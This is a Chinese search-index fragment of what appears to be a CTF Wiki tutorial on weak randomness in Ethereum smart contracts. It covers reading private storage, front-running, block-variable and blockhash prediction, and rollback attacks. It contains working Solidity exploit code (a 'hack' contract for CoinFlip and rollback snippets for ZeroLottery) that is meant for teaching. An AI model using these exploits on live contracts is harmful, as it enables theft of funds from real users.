Web3 \u7684 api \u83b7\u5f97\u79c1\u6709\u53d8\u91cf\u503c\uff0c\u7136\u540e\u8ba1\u7b97\u5f97\u5230\u968f\u673a\u6570\u3002 \u4f8b\u5b50 \u00b6 pragma solidity ^ 0.4.18 ; contract Vault { bool public locked ; bytes32 private password ; function Vault ( bytes32 _password ) public { locked = true ; password = _password ; } function unlock ( bytes32 _password ) public { if ( password == _password ) { locked = false ; } } } \u76f4\u63a5\u4f7f\u7528 web3.eth.getStorageAt \u786e\u5b9a\u53c2\u6570\u8c03\u7528\u5373\u53ef web3.eth.getStorageAt(ContractAddress, \"1\", function(x,y){console.info(y);}) \u5916\u90e8\u53c2\u4e0e\u7684\u968f\u673a\u6570 \u00b6 \u539f\u7406 \u00b6 \u968f\u673a\u6570\u7531\u5176\u4ed6\u670d\u52a1\u7aef\u751f\u6210\u3002\u4e3a\u4e86\u786e\u4fdd\u516c\u5e73\uff0c\u670d\u52a1\u7aef\u4f1a\u5148\u5c06\u968f\u673a\u6570\u6216\u8005\u5176\u79cd\u5b50\u7684\u54c8\u5e0c\u5199\u5165\u5408\u7ea6\u4e2d\uff0c\u7136\u540e\u5f85\u7528\u6237\u64cd\u4f5c\u4e4b\u540e\u518d\u516c\u5e03\u54c8\u5e0c\u5bf9\u5e94\u7684\u660e\u6587\u503c\u3002\u7531\u4e8e\u660e\u6587\u7a7a\u95f4\u6709 256 \u4f4d\uff0c\u8fd9\u6837\u7684\u968f\u673a\u6570\u751f\u6210\u65b9\u6cd5\u76f8\u5bf9\u5b89\u5168\u3002\u4f46\u662f\u5728\u660e\u6587\u63ed\u9732\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u72b6\u6001\u4e3a pending \u7684\u4ea4\u6613\u4e2d\u627e\u5230\u660e\u6587\u6570\u636e\uff0c\u5e76\u4ee5\u66f4\u9ad8\u7684 gas \u62a2\u5728\u4e4b\u524d\u5b8c\u6210\u4ea4\u6613\u786e\u8ba4\u3002 \u4f7f\u7528\u533a\u5757\u53d8\u91cf\u7684\u4f2a\u968f\u673a\u6570 \u00b6 \u539f\u7406 \u00b6 EVM \u6709\u4e94\u4e2a\u5b57\u8282\u7801\u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u533a\u5757\u7684\u53d8\u91cf\uff0c\u5305\u62ec coinbase\u3001timestamp\u3001number\u3001difficulty\u3001gaslimit\u3002\u8fd9\u4e9b\u53d8\u91cf\u5bf9\u77ff\u5de5\u6765\u8bf4\uff0c\u90fd\u662f\u5df2\u77e5\u6216\u8005\u53ef\u64cd\u63a7\u7684\uff0c\u56e0\u6b64\u5728\u79c1\u6709\u94fe\u90e8\u7f72\u7684\u9898\u76ee\u4e2d\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u6076\u610f\u7684\u77ff\u5de5\u63a7\u5236\u968f\u673a\u6570\u7684\u7ed3\u679c\u3002\u5728\u516c\u5f00\u7684\u94fe\u5982 Ropsten \u4e0a\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u5c31\u4e0d\u592a\u53ef\u884c\uff0c\u4f46\u6211\u4eec\u4e5f\u53ef\u4ee5\u7f16\u5199\u653b\u51fb\u5408\u7ea6\uff0c\u5728\u653b\u51fb\u5408\u7ea6\u4e2d\u83b7\u53d6\u5230\u76f8\u540c\u7684\u533a\u5757\u53d8\u91cf\u503c\uff0c\u8fdb\u4e00\u6b65\u7528\u76f8\u540c\u7684\u7b97\u6cd5\u5f97\u5230\u968f\u673a\u6570\u503c\u3002 \u4f8b\u5b50 \u00b6 pragma solidity ^ 0.4.18 ; import 'openzeppelin-solidity/contracts/math/SafeMath.sol' ; contract CoinFlip { using SafeMath for uint256 ; uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; function CoinFlip () public { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( block.blockhash ( block.number . sub ( 1 ))); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue . div ( FACTOR ); bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } \u4ee3\u7801\u5904\u7406\u6d41\u7a0b\u4e3a\uff1a \u83b7\u5f97\u4e0a\u4e00\u5757\u7684 hash \u503c \u5224\u65ad\u4e0e\u4e4b\u524d\u4fdd\u5b58\u7684 hash \u503c\u662f\u5426\u76f8\u7b49\uff0c\u76f8\u7b49\u5219\u4f1a\u9000 \u6839\u636e blockValue/FACTOR \u7684\u503c\u5224\u65ad\u4e3a\u6b63\u6216\u8d1f\uff0c\u5373\u901a\u8fc7 hash \u7684\u9996\u4f4d\u5224\u65ad \u4ee5\u592a\u574a\u533a\u5757\u94fe\u4e0a\u7684\u6240\u6709\u4ea4\u6613\u90fd\u662f\u786e\u5b9a\u6027\u7684\u72b6\u6001\u8f6c\u6362\u64cd\u4f5c\uff0c\u6bcf\u7b14\u4ea4\u6613\u90fd\u4f1a\u6539\u53d8\u4ee5\u592a\u574a\u751f\u6001\u7cfb\u7edf\u7684\u5168\u7403\u72b6\u6001\uff0c\u5e76\u4e14\u662f\u4ee5\u4e00\u79cd\u53ef\u8ba1\u7b97\u7684\u65b9\u5f0f\u8fdb\u884c\uff0c\u8fd9\u610f\u5473\u7740\u5176\u6ca1\u6709\u4efb\u4f55\u7684\u4e0d\u786e\u5b9a\u6027\u3002\u6240\u4ee5\u5728\u533a\u5757\u94fe\u751f\u6001\u7cfb\u7edf\u5185\uff0c\u4e0d\u5b58\u5728\u71b5\u6216\u968f\u673a\u6027\u7684\u6765\u6e90\u3002\u5982\u679c\u4f7f\u7528\u53ef\u4ee5\u88ab\u6316\u77ff\u7684\u77ff\u5de5\u6240\u63a7\u5236\u7684\u53d8\u91cf\uff0c\u5982\u533a\u5757\u54c8\u5e0c\u503c\uff0c\u65f6\u95f4\u6233\uff0c\u533a\u5757\u9ad8\u4f4e\u6216\u662f Gas \u4e0a\u9650\u7b49\u4f5c\u4e3a\u968f\u673a\u6570\u7684\u71b5\u6e90\uff0c\u4ea7\u751f\u7684\u968f\u673a\u6570\u5e76\u4e0d\u5b89\u5168\u3002 \u6240\u4ee5\u7f16\u5199\u5982\u4e0b\u653b\u51fb\u811a\u672c\uff0c\u8c03\u7528 10 \u6b21 exploit() \u5373\u53ef pragma solidity ^ 0.4.18 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; function CoinFlip () public { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( block.blockhash ( block.number - 1 )); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } contract hack { uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; address instance_address = ContractAddress ; CoinFlip c = CoinFlip ( instance_address ); function exploit () public { uint256 blockValue = uint256 ( block.blockhash ( block.number - 1 )); uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; c . flip ( side ); } } \u9898\u76ee \u00b6 0CTF Final 2018 : ZeroLottery \u4f7f\u7528 Blockhash \u7684\u4f2a\u968f\u673a\u6570 \u00b6 \u539f\u7406 \u00b6 Blockhash \u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u533a\u5757\u53d8\u91cf\uff0cEVM \u53ea\u80fd\u83b7\u53d6\u5230\u5f53\u524d\u533a\u5757\u4e4b\u524d\u7684 256 \u4e2a\u533a\u5757\u7684 blockhash \uff08 \u4e0d\u542b\u5f53\u524d\u533a\u5757 \uff09\uff0c\u5bf9\u4e8e\u8fd9 256 \u4e2a\u4e4b\u5916\u7684\u533a\u5757\u8fd4\u56de 0\u3002\u4f7f\u7528 blockhash \u53ef\u80fd\u5b58\u5728\u51e0\u79cd\u95ee\u9898\u3002 \u8bef\u7528\uff0c\u5982 block.blockhash(block.number) \u6052\u4e3a\u96f6\u3002 \u4f7f\u7528\u8fc7\u53bb\u533a\u5757\u7684\u6709\u6548 blockhash \uff0c\u53ef\u4ee5\u7f16\u5199\u653b\u51fb\u5408\u7ea6\u83b7\u53d6\u76f8\u540c\u503c\u3002 \u5c06\u731c\u6570\u5b57\u548c\u5f00\u5956\u7684\u4ea4\u6613\u5206\u5f00\u5728\u4e24\u4e2a\u4e0d\u540c\u533a\u5757\u4e2d\uff0c\u5e76\u4e14\u4f7f\u7528\u731c\u6570\u5b57\u65f6\u8fd8\u4e0d\u77e5\u9053\u7684\u67d0\u4e2a\u533a\u5757\u7684 blockhash \u4f5c\u4e3a\u71b5\u6e90\uff0c\u5219\u53ef\u4ee5\u7b49\u5f85 256 \u4e2a\u533a\u5757\u540e\u518d\u8fdb\u884c\u5f00\u5956\uff0c\u6d88\u9664 blockhash \u7684\u4e0d\u786e\u5b9a\u6027\u3002 \u9898\u76ee \u00b6 Capture The Ether : Predict the block hash\u3001Guess the new number \u534e\u4e3a\u4e91\u5b89\u5168 2020 : ethenc \u56de\u6eda\u653b\u51fb \u00b6 \u539f\u7406 \u00b6 \u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u83b7\u53d6\u968f\u673a\u6570\u53ef\u80fd\u8fc7\u4e8e\u56f0\u96be\u6216\u7e41\u7410\uff0c\u8fd9\u65f6\u53ef\u4ee5\u8003\u8651\u4f7f\u7528\u56de\u6eda\u653b\u51fb\u3002\u56de\u6eda\u653b\u51fb\u7684\u601d\u60f3\u5f88\u7b80\u5355\uff1a\u5b8c\u5168\u78b0\u8fd0\u6c14\uff0c\u8f93\u4e86\u5c31\u201c\u800d\u8d56\u201d\uff0c\u901a\u8fc7\u629b\u51fa\u5f02\u5e38\u4f7f\u6574\u4e2a\u4ea4\u6613\u56de\u6eda\u4e0d\u4f5c\u6570\uff1b\u8d62\u7684\u65f6\u5019\u5219\u4e0d\u4f5c\u5904\u7406\uff0c\u8ba9\u4ea4\u6613\u88ab\u6b63\u5e38\u786e\u8ba4\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u4ee5 0ctf 2018 ZeroLottery \u4e3a\u4f8b\uff0c\u90e8\u5206\u5173\u952e\u4ee3\u7801\u5982\u4e0b\u3002\u5176\u4e2d n \u4e3a\u968f\u673a\u6570\uff0c\u5e76\u4e14\u7701\u7565\u4e86\u5176\u751f\u6210\u65b9\u5f0f\uff0c\u4f46\u6211\u4eec\u77e5\u9053\u5b83\u7684\u8303\u56f4\u662f 0 \u81f3 7\u3002 contract ZeroLottery { ... mapping ( address => uint256 ) public balanceOf ; ... function bet ( uint guess ) public payable { require ( msg.value > 1 ether ); require ( balanceOf [ msg.sender ] > 0 ); uint n = ...; if ( guess != n ) { balanceOf [ msg.sender ] = 0 ; // charge 0.5 ether for failure msg.sender . transfer ( msg.value - 0 . 5 ether ); return ; } // charge 1 ether for success msg.sender . transfer ( msg.value - 1 ether ); balanceOf [ msg.sender ] = balanceOf [ msg.sender ] + 100 ; } ... } \u53ef\u4ee5\u89c2\u5bdf\u5230\u9898\u76ee\u5408\u7ea6\u5728\u6211\u4eec\u731c\u5bf9\u6216\u731c\u9519\u65f6\u6536\u8d39\u4e0d\u540c\uff0c\u5206\u522b\u4e3a 1 ether \u6216 0.5 ether \uff0c\u6211\u4eec\u731c\u6570\u65f6\u591a\u7ed9\u7684\u94b1\u4f1a\u8f6c\u8d26\u8fd8\u7ed9\u6211\u4eec\u3002\u7ed3\u5408\u667a\u80fd\u5408\u7ea6\u6536\u5230\u8f6c\u8d26\u65f6\u4f1a\u8c03\u7528 fallback \u51fd\u6570\u7684\u77e5\u8bc6\u70b9\uff0c\u5047\u8bbe\u6bcf\u6b21\u4f7f\u7528 2 ether \u53bb\u731c\u6570\uff0c\u5982\u679c fallback \u51fd\u6570\u6536\u5230 1.5 ether \u5c31\u56de\u6eda\u3002\u6211\u4eec\u53ef\u4ee5\u56fa\u5b9a\u4e00\u4e2a\u6570\u5b57\u4e00\u76f4\u731c\uff0c\u53ea\u6709\u731c\u5bf9\u7684\u4ea4\u6613\u624d\u4f1a\u88ab\u786e\u8ba4\u3002 function guess () public { task . bet . value ( 2 ether )( 1 ); } function () public payable { require ( msg.value != 1 . 5 ether ); } \u5e76\u4e0d\u662f\u6240\u6709\u9898\u76ee\u90fd\u6d89\u53ca\u8f6c\u8d26\u64cd\u4f5c\uff0c\u4f46\u662f\u901a\u5e38\u90fd\u4f1a\u6709\u4e00\u4e2a\u53d8\u91cf\u8c61\u5f81\u7740\u6b63\u786e\u6b21\u6570\u7b49\uff0cZeroLottery \u4e2d\u5c31\u6709 balanceOf[msg.sender] \u5728\u731c\u5bf9\u65f6\u4f1a\u589e\u52a0\uff0c\u731c\u9519\u65f6\u6e05\u96f6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5b83\u5224\u65ad\u662f\u5426\u731c\u5bf9\u3002 function guess () public { task . bet . value ( 2 ether )( 1 ); require ( task . balanceOf ( this )); } \u4ee5\u4e0a\u4e24\u79cd\u65b9\u6cd5\u90fd\u662f\u9009\u5b9a\u4e00\u4e2a\u6570\u5b57\u91cd\u590d\u731c\u6d4b\uff0c\u5728\u672c\u9898\u516b\u5206\u4e4b\u4e00\u7684\u6982\u7387\u4e4b\u4e0b\u731c\u5bf9\u4e94\u6b21\u83b7\u80dc\uff0c\u9700\u8981\u5927\u7ea6 40 \u7b14\u4ea4\u6613\u624d\u80fd\u5b8c\u6210\u3002\u7531\u4e8e\u540c\u4e00\u4e2a\u533a\u5757\u4e2d\u4ea7\u751f\u7684\u968f\u673a\u6570\u5f80\u5f80\u76f8\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u7a0d\u4f5c\u6539\u8fdb\uff0c\u5728\u6bcf\u4e2a\u533a\u5757\u4e2d\u5c06\u6240\u6709\u516b\u79cd\u53ef\u80fd\u90fd\u731c\u6d4b\u4e00\u904d\uff0c\u5176\u4e2d\u5fc5\u5b9a\u5305\u542b\u6b63\u786e\u7684\u6570\u5b57\u3002\u8fdb\u4e00\u6b65\uff0c\u5982\u679c\u5728\u5355\u7b14\u4ea4\u6613\u4e2d\u8fde\u7eed\u731c\u4e94\u6b21\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u6709\u4e00\u7b14\u4ea4\u6613\u6210\u529f\u786e\u8ba4\u5c31\u53ef\u4ee5\u5b8c\u6210\u9898\u76ee\u8981\u6c42\u3002\u5b9e\u9645\u4e0a\u56e0\u4e3a\u9898\u76ee\u5408\u7ea6\u7684 bet \u51fd\u6570\u81ea\u5e26\u4e86 balanceOf \u975e\u96f6\u7684\u68c0\u67e5\uff0c\u5982\u679c\u6211\u4eec\u8fde\u731c\u591a\u6b21\uff0c\u5931\u8d25\u4e86\u4e5f\u4f1a\u81ea\u52a8\u56de\u6eda\u3002 \u9898\u76ee \u00b6 0ctf final 2018 : ZeroLottery Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"Randomness"},{"location":"blockchain/ethereum/attacks/randomness/#randomness","text":"\u672c\u8282\u8ba8\u8bba\u4ee5\u592a\u574a\u4e2d\u7684\u968f\u673a\u6570\u95ee\u9898\u3002\u7531\u4e8e\u6240\u6709\u4ee5\u592a\u574a\u8282\u70b9\u5728\u9a8c\u8bc1\u4ea4\u6613\u65f6\uff0c\u9700\u8981\u8ba1\u7b97\u51fa\u76f8\u540c\u7684\u7ed3\u679c\u4ee5\u8fbe\u6210\u5171\u8bc6\uff0c\u56e0\u6b64 EVM \u672c\u8eab\u65e0\u6cd5\u5b9e\u73b0\u771f\u968f\u673a\u6570\u7684\u529f\u80fd\u3002\u81f3\u4e8e\u4f2a\u968f\u673a\u6570\uff0c\u5176\u71b5\u6e90\u4e5f\u662f\u53ea\u80fd\u662f\u786e\u5b9a\u503c\u3002\u4e0b\u9762\u8ba8\u8bba\u5404\u79cd\u968f\u673a\u6570\u7684\u5b89\u5168\u6027\uff0c\u5e76\u4ecb\u7ecd\u56de\u6eda\u653b\u51fb\u3002","title":"Randomness"},{"location":"blockchain/ethereum/attacks/randomness/#_1","text":"","title":"\u4f7f\u7528\u79c1\u6709\u53d8\u91cf\u7684\u4f2a\u968f\u673a\u6570"},{"location":"blockchain/ethereum/attacks/randomness/#_2","text":"\u5408\u7ea6\u4f7f\u7528\u5916\u754c\u672a\u77e5\u7684\u79c1\u6709\u53d8\u91cf\u53c2\u4e0e\u968f\u673a\u6570\u751f\u6210\u3002\u867d\u7136\u53d8\u91cf\u662f\u79c1\u6709\u7684\uff0c\u65e0\u6cd5\u901a\u8fc7\u53e6\u4e00\u5408\u7ea6\u8bbf\u95ee\uff0c\u4f46\u662f\u53d8\u91cf\u50a8\u5b58\u8fdb storage \u4e4b\u540e\u4ecd\u7136\u662f\u516c\u5f00\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u533a\u5757\u94fe\u6d4f\u89c8\u5668\uff08\u5982 etherscan\uff09\u89c2\u5bdf storage \u53d8\u52a8\u60c5\u51b5\uff0c\u6216\u8005\u8ba1\u7b97\u53d8\u91cf\u50a8\u5b58\u7684\u4f4d\u7f6e\u5e76\u4f7f\u7528 Web3 \u7684 api \u83b7\u5f97\u79c1\u6709\u53d8\u91cf\u503c\uff0c\u7136\u540e\u8ba1\u7b97\u5f97\u5230\u968f\u673a\u6570\u3002","title":"\u539f\u7406"},{"location":"blockchain/ethereum/attacks/randomness/#_3","text":"pragma solidity ^ 0.4.18 ; contract Vault { bool public locked ; bytes32 private password ; function Vault ( bytes32 _password ) public { locked = true ; password = _password ; } function unlock ( bytes32 _password ) public { if ( password == _password ) { locked = false ; } } } \u76f4\u63a5\u4f7f\u7528 web3.eth.getStorageAt \u786e\u5b9a\u53c2\u6570\u8c03\u7528\u5373\u53ef web3.eth.getStorageAt(ContractAddress, \"1\", function(x,y){console.info(y);})","title":"\u4f8b\u5b50"},{"location":"blockchain/ethereum/attacks/randomness/#_4","text":"","title":"\u5916\u90e8\u53c2\u4e0e\u7684\u968f\u673a\u6570"},{"location":"blockchain/ethereum/attacks/randomness/#_5","text":"\u968f\u673a\u6570\u7531\u5176\u4ed6\u670d\u52a1\u7aef\u751f\u6210\u3002\u4e3a\u4e86\u786e\u4fdd\u516c\u5e73\uff0c\u670d\u52a1\u7aef\u4f1a\u5148\u5c06\u968f\u673a\u6570\u6216\u8005\u5176\u79cd\u5b50\u7684\u54c8\u5e0c\u5199\u5165\u5408\u7ea6\u4e2d\uff0c\u7136\u540e\u5f85\u7528\u6237\u64cd\u4f5c\u4e4b\u540e\u518d\u516c\u5e03\u54c8\u5e0c\u5bf9\u5e94\u7684\u660e\u6587\u503c\u3002\u7531\u4e8e\u660e\u6587\u7a7a\u95f4\u6709 256 \u4f4d\uff0c\u8fd9\u6837\u7684\u968f\u673a\u6570\u751f\u6210\u65b9\u6cd5\u76f8\u5bf9\u5b89\u5168\u3002\u4f46\u662f\u5728\u660e\u6587\u63ed\u9732\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u72b6\u6001\u4e3a pending \u7684\u4ea4\u6613\u4e2d\u627e\u5230\u660e\u6587\u6570\u636e\uff0c\u5e76\u4ee5\u66f4\u9ad8\u7684 gas \u62a2\u5728\u4e4b\u524d\u5b8c\u6210\u4ea4\u6613\u786e\u8ba4\u3002","title":"\u539f\u7406"},{"location":"blockchain/ethereum/attacks/randomness/#_6","text":"","title":"\u4f7f\u7528\u533a\u5757\u53d8\u91cf\u7684\u4f2a\u968f\u673a\u6570"},{"location":"blockchain/ethereum/attacks/randomness/#_7","text":"EVM \u6709\u4e94\u4e2a\u5b57\u8282\u7801\u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u533a\u5757\u7684\u53d8\u91cf\uff0c\u5305\u62ec coinbase\u3001timestamp\u3001number\u3001difficulty\u3001gaslimit\u3002\u8fd9\u4e9b\u53d8\u91cf\u5bf9\u77ff\u5de5\u6765\u8bf4\uff0c\u90fd\u662f\u5df2\u77e5\u6216\u8005\u53ef\u64cd\u63a7\u7684\uff0c\u56e0\u6b64\u5728\u79c1\u6709\u94fe\u90e8\u7f72\u7684\u9898\u76ee\u4e2d\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u6076\u610f\u7684\u77ff\u5de5\u63a7\u5236\u968f\u673a\u6570\u7684\u7ed3\u679c\u3002\u5728\u516c\u5f00\u7684\u94fe\u5982 Ropsten \u4e0a\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u5c31\u4e0d\u592a\u53ef\u884c\uff0c\u4f46\u6211\u4eec\u4e5f\u53ef\u4ee5\u7f16\u5199\u653b\u51fb\u5408\u7ea6\uff0c\u5728\u653b\u51fb\u5408\u7ea6\u4e2d\u83b7\u53d6\u5230\u76f8\u540c\u7684\u533a\u5757\u53d8\u91cf\u503c\uff0c\u8fdb\u4e00\u6b65\u7528\u76f8\u540c\u7684\u7b97\u6cd5\u5f97\u5230\u968f\u673a\u6570\u503c\u3002","title":"\u539f\u7406"},{"location":"blockchain/ethereum/attacks/randomness/#_8","text":"pragma solidity ^ 0.4.18 ; import 'openzeppelin-solidity/contracts/math/SafeMath.sol' ; contract CoinFlip { using SafeMath for uint256 ; uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; function CoinFlip () public { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( block.blockhash ( block.number . sub ( 1 ))); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue . div ( FACTOR ); bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } \u4ee3\u7801\u5904\u7406\u6d41\u7a0b\u4e3a\uff1a \u83b7\u5f97\u4e0a\u4e00\u5757\u7684 hash \u503c \u5224\u65ad\u4e0e\u4e4b\u524d\u4fdd\u5b58\u7684 hash \u503c\u662f\u5426\u76f8\u7b49\uff0c\u76f8\u7b49\u5219\u4f1a\u9000 \u6839\u636e blockValue/FACTOR \u7684\u503c\u5224\u65ad\u4e3a\u6b63\u6216\u8d1f\uff0c\u5373\u901a\u8fc7 hash \u7684\u9996\u4f4d\u5224\u65ad \u4ee5\u592a\u574a\u533a\u5757\u94fe\u4e0a\u7684\u6240\u6709\u4ea4\u6613\u90fd\u662f\u786e\u5b9a\u6027\u7684\u72b6\u6001\u8f6c\u6362\u64cd\u4f5c\uff0c\u6bcf\u7b14\u4ea4\u6613\u90fd\u4f1a\u6539\u53d8\u4ee5\u592a\u574a\u751f\u6001\u7cfb\u7edf\u7684\u5168\u7403\u72b6\u6001\uff0c\u5e76\u4e14\u662f\u4ee5\u4e00\u79cd\u53ef\u8ba1\u7b97\u7684\u65b9\u5f0f\u8fdb\u884c\uff0c\u8fd9\u610f\u5473\u7740\u5176\u6ca1\u6709\u4efb\u4f55\u7684\u4e0d\u786e\u5b9a\u6027\u3002\u6240\u4ee5\u5728\u533a\u5757\u94fe\u751f\u6001\u7cfb\u7edf\u5185\uff0c\u4e0d\u5b58\u5728\u71b5\u6216\u968f\u673a\u6027\u7684\u6765\u6e90\u3002\u5982\u679c\u4f7f\u7528\u53ef\u4ee5\u88ab\u6316\u77ff\u7684\u77ff\u5de5\u6240\u63a7\u5236\u7684\u53d8\u91cf\uff0c\u5982\u533a\u5757\u54c8\u5e0c\u503c\uff0c\u65f6\u95f4\u6233\uff0c\u533a\u5757\u9ad8\u4f4e\u6216\u662f Gas \u4e0a\u9650\u7b49\u4f5c\u4e3a\u968f\u673a\u6570\u7684\u71b5\u6e90\uff0c\u4ea7\u751f\u7684\u968f\u673a\u6570\u5e76\u4e0d\u5b89\u5168\u3002 \u6240\u4ee5\u7f16\u5199\u5982\u4e0b\u653b\u51fb\u811a\u672c\uff0c\u8c03\u7528 10 \u6b21 exploit() \u5373\u53ef pragma solidity ^ 0.4.18 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; function CoinFlip () public { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( block.blockhash ( block.number - 1 )); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } contract hack { uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; address instance_address = ContractAddress ; CoinFlip c = CoinFlip ( instance_address ); function exploit () public { uint256 blockValue = uint256 ( block.blockhash ( block.number - 1 )); uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; c . flip ( side ); } }","title":"\u4f8b\u5b50"},{"location":"blockchain/ethereum/attacks/randomness/#_9","text":"0CTF Final 2018 : ZeroLottery","title":"\u9898\u76ee"},{"location":"blockchain/ethereum/attacks/randomness/#blockhash","text":"","title":"\u4f7f\u7528 Blockhash \u7684\u4f2a\u968f\u673a\u6570"},{"location":"blockchain/ethereum/attacks/randomness/#_10","text":"Blockhash \u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u533a\u5757\u53d8\u91cf\uff0cEVM \u53ea\u80fd\u83b7\u53d6\u5230\u5f53\u524d\u533a\u5757\u4e4b\u524d\u7684 256 \u4e2a\u533a\u5757\u7684 blockhash \uff08 \u4e0d\u542b\u5f53\u524d\u533a\u5757 \uff09\uff0c\u5bf9\u4e8e\u8fd9 256 \u4e2a\u4e4b\u5916\u7684\u533a\u5757\u8fd4\u56de 0\u3002\u4f7f\u7528 blockhash \u53ef\u80fd\u5b58\u5728\u51e0\u79cd\u95ee\u9898\u3002 \u8bef\u7528\uff0c\u5982 block.blockhash(block.number) \u6052\u4e3a\u96f6\u3002 \u4f7f\u7528\u8fc7\u53bb\u533a\u5757\u7684\u6709\u6548 blockhash \uff0c\u53ef\u4ee5\u7f16\u5199\u653b\u51fb\u5408\u7ea6\u83b7\u53d6\u76f8\u540c\u503c\u3002 \u5c06\u731c\u6570\u5b57\u548c\u5f00\u5956\u7684\u4ea4\u6613\u5206\u5f00\u5728\u4e24\u4e2a\u4e0d\u540c\u533a\u5757\u4e2d\uff0c\u5e76\u4e14\u4f7f\u7528\u731c\u6570\u5b57\u65f6\u8fd8\u4e0d\u77e5\u9053\u7684\u67d0\u4e2a\u533a\u5757\u7684 blockhash \u4f5c\u4e3a\u71b5\u6e90\uff0c\u5219\u53ef\u4ee5\u7b49\u5f85 256 \u4e2a\u533a\u5757\u540e\u518d\u8fdb\u884c\u5f00\u5956\uff0c\u6d88\u9664 blockhash \u7684\u4e0d\u786e\u5b9a\u6027\u3002","title":"\u539f\u7406"},{"location":"blockchain/ethereum/attacks/randomness/#_11","text":"Capture The Ether : Predict the block hash\u3001Guess the new number \u534e\u4e3a\u4e91\u5b89\u5168 2020 : ethenc","title":"\u9898\u76ee"},{"location":"blockchain/ethereum/attacks/randomness/#_12","text":"","title":"\u56de\u6eda\u653b\u51fb"},{"location":"blockchain/ethereum/attacks/randomness/#_13","text":"\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u83b7\u53d6\u968f\u673a\u6570\u53ef\u80fd\u8fc7\u4e8e\u56f0\u96be\u6216\u7e41\u7410\uff0c\u8fd9\u65f6\u53ef\u4ee5\u8003\u8651\u4f7f\u7528\u56de\u6eda\u653b\u51fb\u3002\u56de\u6eda\u653b\u51fb\u7684\u601d\u60f3\u5f88\u7b80\u5355\uff1a\u5b8c\u5168\u78b0\u8fd0\u6c14\uff0c\u8f93\u4e86\u5c31\u201c\u800d\u8d56\u201d\uff0c\u901a\u8fc7\u629b\u51fa\u5f02\u5e38\u4f7f\u6574\u4e2a\u4ea4\u6613\u56de\u6eda\u4e0d\u4f5c\u6570\uff1b\u8d62\u7684\u65f6\u5019\u5219\u4e0d\u4f5c\u5904\u7406\uff0c\u8ba9\u4ea4\u6613\u88ab\u6b63\u5e38\u786e\u8ba4\u3002","title":"\u539f\u7406"},{"location":"blockchain/ethereum/attacks/randomness/#_14","text":"\u8fd9\u91cc\u4ee5 0ctf 2018 ZeroLottery \u4e3a\u4f8b\uff0c\u90e8\u5206\u5173\u952e\u4ee3\u7801\u5982\u4e0b\u3002\u5176\u4e2d n \u4e3a\u968f\u673a\u6570\uff0c\u5e76\u4e14\u7701\u7565\u4e86\u5176\u751f\u6210\u65b9\u5f0f\uff0c\u4f46\u6211\u4eec\u77e5\u9053\u5b83\u7684\u8303\u56f4\u662f 0 \u81f3 7\u3002 contract ZeroLottery { ... mapping ( address => uint256 ) public balanceOf ; ... function bet ( uint guess ) public payable { require ( msg.value > 1 ether ); require ( balanceOf [ msg.sender ] > 0 ); uint n = ...; if ( guess != n ) { balanceOf [ msg.sender ] = 0 ; // charge 0.5 ether for failure msg.sender . transfer ( msg.value - 0 . 5 ether ); return ; } // charge 1 ether for success msg.sender . transfer ( msg.value - 1 ether ); balanceOf [ msg.sender ] = balanceOf [ msg.sender ] + 100 ; } ... } 